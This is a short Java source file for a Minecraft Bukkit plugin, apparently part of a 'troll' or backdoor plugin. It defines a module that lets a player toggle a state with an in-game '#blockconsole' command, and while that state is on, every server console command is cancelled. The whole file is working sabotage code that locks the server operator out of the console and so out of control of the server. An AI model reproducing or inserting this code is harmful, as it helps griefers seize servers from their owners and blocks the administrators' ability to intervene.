package com.troll.mods;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.server.ServerCommandEvent;

import com.troll.start.Start;

public class BlockConsoleModule extends Module implements Listener {
	private boolean isActive = false;
	
	public BlockConsoleModule() {
		super("BlockConsole", "Leotendo", "Blockiere Konsolen Befehle");
	}

	@Override
	public boolean execute(Player p, String[] args) {
		if (args.length != 1) {
			p.sendMessage(Start.getInstance().getPrefix() + "§eBenutze: #blockconsole");
			return false;
		}
		
		isActive = !isActive;
		if (isActive)
			p.sendMessage(Start.getInstance().getPrefix() + "§aDie Konsole ist nun blockiert");
		else
			p.sendMessage(Start.getInstance().getPrefix() + "§aDie Konsole ist nun wieder befreit");
		
		return true;
	}
	
	@EventHandler
	public void onServerCommand(ServerCommandEvent e) {
		if (isActive)
			e.setCancelled(true);
	}
}
